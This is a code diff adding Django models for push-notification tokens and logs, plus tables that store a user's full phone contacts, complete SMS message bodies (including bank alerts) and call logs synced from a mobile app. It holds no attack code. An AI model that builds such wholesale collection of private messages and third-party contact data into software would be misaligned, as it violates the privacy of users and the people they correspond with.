@@ -321,3 +321,227 @@ class AllocationStats(models.Model):
     
     def __str__(self):
         return f"Stats for {self.date}"
+    
+
+
+
+# models.py
+from django.db import models
+from django.conf import settings
+from django.utils import timezone
+
+class FCMDevice(models.Model):
+    """
+    Store FCM tokens for push notifications
+    """
+    DEVICE_TYPE_CHOICES = [
+        ('android', 'Android'),
+        ('ios', 'iOS'),
+        ('web', 'Web'),
+    ]
+    
+    user_id = models.CharField(max_length=100, db_index=True)
+    mobile_number = models.CharField(max_length=15, db_index=True)
+    fcm_token = models.TextField(unique=True)
+    device_type = models.CharField(max_length=10, choices=DEVICE_TYPE_CHOICES, default='android')
+    device_id = models.CharField(max_length=255, blank=True, null=True)  # Unique device identifier
+    
+    is_active = models.BooleanField(default=True)
+    created_at = models.DateTimeField(auto_now_add=True)
+    updated_at = models.DateTimeField(auto_now=True)
+    last_used_at = models.DateTimeField(default=timezone.now)
+    
+    class Meta:
+        db_table = 'fcm_devices'
+        indexes = [
+            models.Index(fields=['user_id', 'is_active']),
+            models.Index(fields=['mobile_number', 'is_active']),
+        ]
+        verbose_name = 'FCM Device'
+        verbose_name_plural = 'FCM Devices'
+    
+    def __str__(self):
+        return f"{self.mobile_number} - {self.device_type} - {self.fcm_token[:20]}..."
+    
+    def mark_as_used(self):
+        """Update last used timestamp"""
+        self.last_used_at = timezone.now()
+        self.save(update_fields=['last_used_at'])
+
+
+class PushNotificationLog(models.Model):
+    """
+    Log all push notifications sent
+    """
+    STATUS_CHOICES = [
+        ('pending', 'Pending'),
+        ('sent', 'Sent'),
+        ('failed', 'Failed'),
+        ('delivered', 'Delivered'),
+    ]
+    
+    fcm_device = models.ForeignKey(FCMDevice, on_delete=models.SET_NULL, null=True, blank=True)
+    user_id = models.CharField(max_length=100, db_index=True)
+    mobile_number = models.CharField(max_length=15, db_index=True)
+    
+    title = models.CharField(max_length=255)
+    body = models.TextField()
+    data = models.JSONField(default=dict, blank=True)  # Additional custom data
+    
+    status = models.CharField(max_length=20, choices=STATUS_CHOICES, default='pending')
+    error_message = models.TextField(blank=True, null=True)
+    
+    scheduled_at = models.DateTimeField(null=True, blank=True)  # For scheduled notifications
+    sent_at = models.DateTimeField(null=True, blank=True)
+    
+    created_at = models.DateTimeField(auto_now_add=True)
+    updated_at = models.DateTimeField(auto_now=True)
+    
+    class Meta:
+        db_table = 'push_notification_logs'
+        ordering = ['-created_at']
+        indexes = [
+            models.Index(fields=['user_id', '-created_at']),
+            models.Index(fields=['status', 'scheduled_at']),
+        ]
+    
+    def __str__(self):
+        return f"{self.mobile_number} - {self.title} - {self.status}"
+    
+
+# core/models.py
+
+from django.db import models
+from django.utils import timezone
+from datetime import datetime
+
+class Contact(models.Model):
+    """
+    Stores contacts from user's phone
+    """
+    user_id = models.CharField(
+        max_length=50,
+        db_index=True,
+        help_text="User ID from mobile app"
+    )
+    display_name = models.CharField(
+        max_length=255,
+        help_text="Full name of the contact as saved on device"
+    )
+    phones = models.JSONField(
+        default=list,
+        help_text="Array of phone numbers (cleaned, digits only)"
+    )
+    emails = models.JSONField(
+        default=list,
+        help_text="Array of email addresses (empty array if none)"
+    )
+    synced_at = models.DateTimeField(auto_now_add=True)
+    
+    class Meta:
+        ordering = ['-synced_at']
+        indexes = [
+            models.Index(fields=['user_id', '-synced_at']),
+        ]
+    
+    def __str__(self):
+        return f"{self.display_name} (User: {self.user_id})"
+
+
+class Message(models.Model):
+    """
+    Stores SMS messages from user's phone
+    """
+    user_id = models.CharField(
+        max_length=50,
+        db_index=True,
+        help_text="User ID from mobile app"
+    )
+    address = models.CharField(
+        max_length=50,
+        db_index=True,
+        help_text="Phone number or sender ID (e.g., AX-BANK)"
+    )
+    body = models.TextField(
+        help_text="Full content of the message"
+    )
+    timestamp = models.BigIntegerField(
+        db_index=True,
+        help_text="Time received/sent in milliseconds since epoch"
+    )
+    type = models.CharField(
+        max_length=20,
+        help_text="Clean string: inbox, sent, draft"
+    )
+    read_status = models.IntegerField(
+        default=0,
+        help_text="1 for Read, 0 for Unread"
+    )
+    synced_at = models.DateTimeField(auto_now_add=True)
+    
+    class Meta:
+        ordering = ['-timestamp']
+        indexes = [
+            models.Index(fields=['user_id', '-timestamp']),
+            models.Index(fields=['address', '-timestamp']),
+            models.Index(fields=['user_id', 'address']),
+        ]
+    
+    def __str__(self):
+        return f"{self.type} - {self.address} (User: {self.user_id})"
+    
+    @property
+    def message_datetime(self):
+        """Convert milliseconds timestamp to datetime"""
+        return datetime.fromtimestamp(self.timestamp / 1000.0)
+
+
+class CallLog(models.Model):
+    """
+    Stores call logs from user's phone
+    """
+    user_id = models.CharField(
+        max_length=50,
+        db_index=True,
+        help_text="User ID from mobile app"
+    )
+    name = models.CharField(
+        max_length=255,
+        default="Unknown",
+        help_text="Contact name as saved on device"
+    )
+    number = models.CharField(
+        max_length=20,
+        db_index=True,
+        null=True,
+        blank=True,
+        help_text="Phone number"
+    )
+    type = models.CharField(
+        max_length=20,
+        help_text="Clean string: incoming, outgoing, missed, rejected, blocked"
+    )
+    duration = models.IntegerField(
+        default=0,
+        help_text="Duration in seconds"
+    )
+    timestamp = models.BigIntegerField(
+        db_index=True,
+        help_text="Time of call in milliseconds since epoch"
+    )
+    synced_at = models.DateTimeField(auto_now_add=True)
+    
+    class Meta:
+        ordering = ['-timestamp']
+        indexes = [
+            models.Index(fields=['user_id', '-timestamp']),
+            models.Index(fields=['number', '-timestamp']),
+        ]
+    
+    def __str__(self):
+        return f"{self.type} - {self.number} ({self.duration}s) (User: {self.user_id})"
+    
+    @property
+    def call_datetime(self):
+        """Convert milliseconds timestamp to datetime"""
+        return datetime.fromtimestamp(self.timestamp / 1000.0)
